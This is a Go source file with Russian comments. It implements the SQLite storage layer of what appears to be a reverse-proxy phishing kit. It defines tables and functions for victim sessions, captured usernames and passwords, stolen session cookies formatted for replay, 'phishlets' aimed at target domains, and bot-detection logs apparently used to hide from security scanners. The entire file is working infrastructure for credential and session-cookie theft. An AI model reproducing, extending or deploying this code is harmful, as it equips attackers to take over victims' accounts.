package database

import (
	"database/sql"
	"encoding/json"
	"time"

	"github.com/google/uuid"
	_ "github.com/mattn/go-sqlite3"
)

// Database представляет подключение к базе данных
type Database struct {
	db *sql.DB
}

// Session представляет сессию жертвы
type Session struct {
	ID           string    `json:"id"`
	VictimIP     string    `json:"victim_ip"`
	TargetURL    string    `json:"target_url"`
	PhishletID   string    `json:"phishlet_id"`
	UserAgent    string    `json:"user_agent"`
	JA3Hash      string    `json:"ja3_hash"`
	State        string    `json:"state"` // active, captured, expired
	CreatedAt    time.Time `json:"created_at"`
	LastActive   time.Time `json:"last_active"`
	Credentials  *Credentials `json:"credentials,omitempty"`
}

// Credentials представляет перехваченные учётные данные
type Credentials struct {
	ID           string                 `json:"id"`
	SessionID    string                 `json:"session_id"`
	Username     string                 `json:"username"`
	Password     string                 `json:"password"`
	CustomFields map[string]string      `json:"custom_fields"`
	CapturedAt   time.Time              `json:"captured_at"`
}

// Cookie представляет cookie сессии
type Cookie struct {
	ID        string    `json:"id"`
	SessionID string    `json:"session_id"`
	Name      string    `json:"name"`
	Value     string    `json:"value"`
	Domain    string    `json:"domain"`
	Path      string    `json:"path"`
	Expires   time.Time `json:"expires"`
	HTTPOnly  bool      `json:"http_only"`
	Secure    bool      `json:"secure"`
}

// NewDatabase создаёт новую базу данных SQLite
func NewDatabase(path string) (*Database, error) {
	db, err := sql.Open("sqlite3", path)
	if err != nil {
		return nil, err
	}
	
	// Включение WAL режима для лучшей производительности
	_, err = db.Exec(`PRAGMA journal_mode=WAL;`)
	if err != nil {
		return nil, err
	}
	
	// Создание таблиц
	if err := createTables(db); err != nil {
		return nil, err
	}
	
	return &Database{db: db}, nil
}

func createTables(db *sql.DB) error {
	schema := `
	-- Сессии
	CREATE TABLE IF NOT EXISTS sessions (
		id TEXT PRIMARY KEY,
		victim_ip TEXT NOT NULL,
		target_url TEXT NOT NULL,
		phishlet_id TEXT,
		user_agent TEXT,
		ja3_hash TEXT,
		state TEXT DEFAULT 'active',
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		last_active DATETIME DEFAULT CURRENT_TIMESTAMP
	);
	
	-- Креденшалы
	CREATE TABLE IF NOT EXISTS credentials (
		id TEXT PRIMARY KEY,
		session_id TEXT NOT NULL,
		username TEXT,
		password TEXT,
		custom_fields TEXT,
		captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		FOREIGN KEY (session_id) REFERENCES sessions(id) ON DELETE CASCADE
	);
	
	-- Cookies
	CREATE TABLE IF NOT EXISTS cookies (
		id TEXT PRIMARY KEY,
		session_id TEXT NOT NULL,
		name TEXT NOT NULL,
		value TEXT NOT NULL,
		domain TEXT,
		path TEXT,
		expires DATETIME,
		http_only BOOLEAN DEFAULT FALSE,
		secure BOOLEAN DEFAULT FALSE,
		FOREIGN KEY (session_id) REFERENCES sessions(id) ON DELETE CASCADE
	);
	
	-- Phishlets
	CREATE TABLE IF NOT EXISTS phishlets (
		id TEXT PRIMARY KEY,
		name TEXT NOT NULL,
		target_domain TEXT NOT NULL,
		config TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		updated_at DATETIME,
		is_active BOOLEAN DEFAULT TRUE
	);
	
	-- Логи бот-детекта
	CREATE TABLE IF NOT EXISTS bot_detection_logs (
		id TEXT PRIMARY KEY,
		session_id TEXT,
		ja3_hash TEXT,
		ml_score REAL,
		is_bot BOOLEAN,
		features TEXT,
		detected_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		FOREIGN KEY (session_id) REFERENCES sessions(id) ON DELETE CASCADE
	);
	
	-- Индексы для ускорения поиска
	CREATE INDEX IF NOT EXISTS idx_sessions_victim_ip ON sessions(victim_ip);
	CREATE INDEX IF NOT EXISTS idx_sessions_created_at ON sessions(created_at DESC);
	CREATE INDEX IF NOT EXISTS idx_credentials_session_id ON credentials(session_id);
	CREATE INDEX IF NOT EXISTS idx_cookies_session_id ON cookies(session_id);
	CREATE INDEX IF NOT EXISTS idx_bot_detection_ja3 ON bot_detection_logs(ja3_hash);
	`
	
	_, err := db.Exec(schema)
	return err
}

// Close закрывает подключение к базе данных
func (d *Database) Close() error {
	return d.db.Close()
}

// Session методы

// CreateSession создаёт новую сессию
func (d *Database) CreateSession(victimIP, targetURL, userAgent, ja3Hash string) (*Session, error) {
	id := uuid.New().String()
	now := time.Now()
	
	query := `
		INSERT INTO sessions (id, victim_ip, target_url, user_agent, ja3_hash, state, created_at, last_active)
		VALUES (?, ?, ?, ?, ?, 'active', ?, ?)
	`
	
	_, err := d.db.Exec(query, id, victimIP, targetURL, userAgent, ja3Hash, now, now)
	if err != nil {
		return nil, err
	}
	
	return &Session{
		ID:         id,
		VictimIP:   victimIP,
		TargetURL:  targetURL,
		UserAgent:  userAgent,
		JA3Hash:    ja3Hash,
		State:      "active",
		CreatedAt:  now,
		LastActive: now,
	}, nil
}

// GetSession получает сессию по ID
func (d *Database) GetSession(id string) (*Session, error) {
	query := `
		SELECT id, victim_ip, target_url, phishlet_id, user_agent, ja3_hash, state, created_at, last_active
		FROM sessions
		WHERE id = ?
	`
	
	s := &Session{}
	err := d.db.QueryRow(query, id).Scan(
		&s.ID, &s.VictimIP, &s.TargetURL, &s.PhishletID,
		&s.UserAgent, &s.JA3Hash, &s.State, &s.CreatedAt, &s.LastActive,
	)
	if err != nil {
		return nil, err
	}
	
	return s, nil
}

// GetSessionByIP получает сессию по IP жертвы
func (d *Database) GetSessionByIP(victimIP string) (*Session, error) {
	query := `
		SELECT id, victim_ip, target_url, phishlet_id, user_agent, ja3_hash, state, created_at, last_active
		FROM sessions
		WHERE victim_ip = ? AND state = 'active'
		ORDER BY created_at DESC
		LIMIT 1
	`
	
	s := &Session{}
	err := d.db.QueryRow(query, victimIP).Scan(
		&s.ID, &s.VictimIP, &s.TargetURL, &s.PhishletID,
		&s.UserAgent, &s.JA3Hash, &s.State, &s.CreatedAt, &s.LastActive,
	)
	if err != nil {
		return nil, err
	}
	
	return s, nil
}

// UpdateSessionLastActive обновляет время последней активности
func (d *Database) UpdateSessionLastActive(id string) error {
	query := `UPDATE sessions SET last_active = CURRENT_TIMESTAMP WHERE id = ?`
	_, err := d.db.Exec(query, id)
	return err
}

// SetSessionState обновляет состояние сессии
func (d *Database) SetSessionState(id, state string) error {
	query := `UPDATE sessions SET state = ? WHERE id = ?`
	_, err := d.db.Exec(query, state, id)
	return err
}

// ListSessions возвращает список сессий
func (d *Database) ListSessions(limit, offset int) ([]*Session, error) {
	query := `
		SELECT id, victim_ip, target_url, phishlet_id, user_agent, ja3_hash, state, created_at, last_active
		FROM sessions
		ORDER BY created_at DESC
		LIMIT ? OFFSET ?
	`
	
	rows, err := d.db.Query(query, limit, offset)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	
	var sessions []*Session
	for rows.Next() {
		s := &Session{}
		err := rows.Scan(
			&s.ID, &s.VictimIP, &s.TargetURL, &s.PhishletID,
			&s.UserAgent, &s.JA3Hash, &s.State, &s.CreatedAt, &s.LastActive,
		)
		if err != nil {
			return nil, err
		}
		sessions = append(sessions, s)
	}
	
	return sessions, rows.Err()
}

// DeleteSession удаляет сессию
func (d *Database) DeleteSession(id string) error {
	query := `DELETE FROM sessions WHERE id = ?`
	_, err := d.db.Exec(query, id)
	return err
}

// Credential методы

// SaveCredentials сохраняет учётные данные
func (d *Database) SaveCredentials(sessionID, username, password string, customFields map[string]string) (*Credentials, error) {
	id := uuid.New().String()
	
	customJSON, err := json.Marshal(customFields)
	if err != nil {
		return nil, err
	}
	
	query := `
		INSERT INTO credentials (id, session_id, username, password, custom_fields, captured_at)
		VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
	`
	
	_, err = d.db.Exec(query, id, sessionID, username, password, string(customJSON))
	if err != nil {
		return nil, err
	}
	
	// Обновляем состояние сессии
	if err := d.SetSessionState(sessionID, "captured"); err != nil {
		return nil, err
	}
	
	return &Credentials{
		ID:           id,
		SessionID:    sessionID,
		Username:     username,
		Password:     password,
		CustomFields: customFields,
		CapturedAt:   time.Now(),
	}, nil
}

// GetCredentials получает учётные данные по сессии
func (d *Database) GetCredentials(sessionID string) (*Credentials, error) {
	query := `
		SELECT id, session_id, username, password, custom_fields, captured_at
		FROM credentials
		WHERE session_id = ?
	`
	
	c := &Credentials{}
	var customJSON string
	err := d.db.QueryRow(query, sessionID).Scan(
		&c.ID, &c.SessionID, &c.Username, &c.Password, &customJSON, &c.CapturedAt,
	)
	if err != nil {
		return nil, err
	}
	
	if err := json.Unmarshal([]byte(customJSON), &c.CustomFields); err != nil {
		return nil, err
	}
	
	return c, nil
}

// ListCredentials возвращает список учётных данных
func (d *Database) ListCredentials(limit, offset int) ([]*Credentials, error) {
	query := `
		SELECT id, session_id, username, password, custom_fields, captured_at
		FROM credentials
		ORDER BY captured_at DESC
		LIMIT ? OFFSET ?
	`
	
	rows, err := d.db.Query(query, limit, offset)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	
	var creds []*Credentials
	for rows.Next() {
		c := &Credentials{}
		var customJSON string
		err := rows.Scan(&c.ID, &c.SessionID, &c.Username, &c.Password, &customJSON, &c.CapturedAt)
		if err != nil {
			return nil, err
		}
		if err := json.Unmarshal([]byte(customJSON), &c.CustomFields); err != nil {
			return nil, err
		}
		creds = append(creds, c)
	}
	
	return creds, rows.Err()
}

// Cookie методы

// SaveCookie сохраняет cookie
func (d *Database) SaveCookie(sessionID, name, value, domain, path string, expires time.Time, httpOnly, secure bool) error {
	id := uuid.New().String()
	
	query := `
		INSERT INTO cookies (id, session_id, name, value, domain, path, expires, http_only, secure)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
	`
	
	_, err := d.db.Exec(query, id, sessionID, name, value, domain, path, expires, httpOnly, secure)
	return err
}

// GetCookies получает все cookies сессии
func (d *Database) GetCookies(sessionID string) ([]*Cookie, error) {
	query := `
		SELECT id, session_id, name, value, domain, path, expires, http_only, secure
		FROM cookies
		WHERE session_id = ?
	`
	
	rows, err := d.db.Query(query, sessionID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	
	var cookies []*Cookie
	for rows.Next() {
		c := &Cookie{}
		err := rows.Scan(&c.ID, &c.SessionID, &c.Name, &c.Value, &c.Domain, &c.Path, &c.Expires, &c.HTTPOnly, &c.Secure)
		if err != nil {
			return nil, err
		}
		cookies = append(cookies, c)
	}
	
	return cookies, rows.Err()
}

// GetSessionCookies возвращает cookies в формате http.Cookie
func (d *Database) GetSessionCookies(sessionID string) ([]string, error) {
	cookies, err := d.GetCookies(sessionID)
	if err != nil {
		return nil, err
	}
	
	var result []string
	for _, c := range cookies {
		result = append(result, formatCookie(c))
	}
	
	return result, nil
}

func formatCookie(c *Cookie) string {
	return c.Name + "=" + c.Value
}

// Phishlet методы

// SavePhishlet сохраняет phishlet
func (d *Database) SavePhishlet(id, name, targetDomain, configYAML string) error {
	query := `
		INSERT OR REPLACE INTO phishlets (id, name, target_domain, config, created_at, updated_at, is_active)
		VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, TRUE)
	`
	
	_, err := d.db.Exec(query, id, name, targetDomain, configYAML)
	return err
}

// GetPhishlet получает phishlet по ID
func (d *Database) GetPhishlet(id string) (string, error) {
	query := `SELECT config FROM phishlets WHERE id = ? AND is_active = TRUE`
	
	var config string
	err := d.db.QueryRow(query, id).Scan(&config)
	if err != nil {
		return "", err
	}
	
	return config, nil
}

// ListPhishlets возвращает список phishlets
func (d *Database) ListPhishlets() ([]map[string]interface{}, error) {
	query := `
		SELECT id, name, target_domain, created_at, updated_at, is_active
		FROM phishlets
		ORDER BY created_at DESC
	`
	
	rows, err := d.db.Query(query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	
	var phishlets []map[string]interface{}
	for rows.Next() {
		p := make(map[string]interface{})
		var id, name, targetDomain string
		var createdAt, updatedAt time.Time
		var isActive bool
		
		err := rows.Scan(&id, &name, &targetDomain, &createdAt, &updatedAt, &isActive)
		if err != nil {
			return nil, err
		}
		
		p["id"] = id
		p["name"] = name
		p["target_domain"] = targetDomain
		p["created_at"] = createdAt
		p["updated_at"] = updatedAt
		p["is_active"] = isActive
		
		phishlets = append(phishlets, p)
	}
	
	return phishlets, rows.Err()
}

// Bot detection логи

// LogBotDetection сохраняет результат детекта бота
func (d *Database) LogBotDetection(sessionID, ja3Hash string, mlScore float32, isBot bool, features map[string]float32) error {
	id := uuid.New().String()
	
	featuresJSON, err := json.Marshal(features)
	if err != nil {
		return err
	}
	
	query := `
		INSERT INTO bot_detection_logs (id, session_id, ja3_hash, ml_score, is_bot, features, detected_at)
		VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
	`
	
	_, err = d.db.Exec(query, id, sessionID, ja3Hash, mlScore, isBot, string(featuresJSON))
	return err
}

// Stats методы

// GetStats возвращает общую статистику
func (d *Database) GetStats() (map[string]interface{}, error) {
	stats := make(map[string]interface{})
	
	// Всего сессий
	var totalSessions int
	err := d.db.QueryRow("SELECT COUNT(*) FROM sessions").Scan(&totalSessions)
	if err != nil {
		return nil, err
	}
	stats["total_sessions"] = totalSessions
	
	// Активные сессии
	var activeSessions int
	err = d.db.QueryRow("SELECT COUNT(*) FROM sessions WHERE state = 'active'").Scan(&activeSessions)
	if err != nil {
		return nil, err
	}
	stats["active_sessions"] = activeSessions
	
	// Захваченные сессии
	var capturedSessions int
	err = d.db.QueryRow("SELECT COUNT(*) FROM sessions WHERE state = 'captured'").Scan(&capturedSessions)
	if err != nil {
		return nil, err
	}
	stats["captured_sessions"] = capturedSessions
	
	// Всего креденшалов
	var totalCreds int
	err = d.db.QueryRow("SELECT COUNT(*) FROM credentials").Scan(&totalCreds)
	if err != nil {
		return nil, err
	}
	stats["total_credentials"] = totalCreds
	
	// Активных phishlets
	var activePhishlets int
	err = d.db.QueryRow("SELECT COUNT(*) FROM phishlets WHERE is_active = TRUE").Scan(&activePhishlets)
	if err != nil {
		return nil, err
	}
	stats["active_phishlets"] = activePhishlets
	
	return stats, nil
}
